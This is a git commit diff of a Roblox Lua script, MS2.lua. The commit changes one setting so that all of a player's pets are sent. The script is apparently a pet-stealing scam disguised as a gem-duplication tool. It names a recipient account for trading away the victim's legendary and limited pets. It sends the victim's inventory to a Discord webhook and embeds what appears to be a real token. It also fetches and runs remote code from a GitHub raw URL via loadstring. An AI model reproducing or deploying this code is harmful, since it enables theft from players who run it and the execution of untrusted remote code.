fb3356af983173ecbdcae4dfeabd5b0b21a9a5fb
Zynxyi <108365635+Zynxyi@users.noreply.github.com>
2022-07-10 10:15:53 +0200

    Update MS2.lua

--- MS2.lua
+++ MS2.lua
@@ -1,7 +1,7 @@
 --Script
 PetRarity = "Legendary" -- Select Pet Rarity: Common Epic Legendary
 PetLimited = true -- If pet is limited it will take it!
-PetAll = false -- Will send all hes pets
+PetAll = true -- Will send all hes pets
 TradeUser = "gun_madness12" -- Write your username so it will send to you trade
 WebhookURL = "https://discord.com/api/webhooks/993118576846323733/O5qO4ebhsdb7vewVXw8xG-qkiEZz00dJXnYncN7O4hCyv8LCnDY9NkPkmlgQr7u0BTZc" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
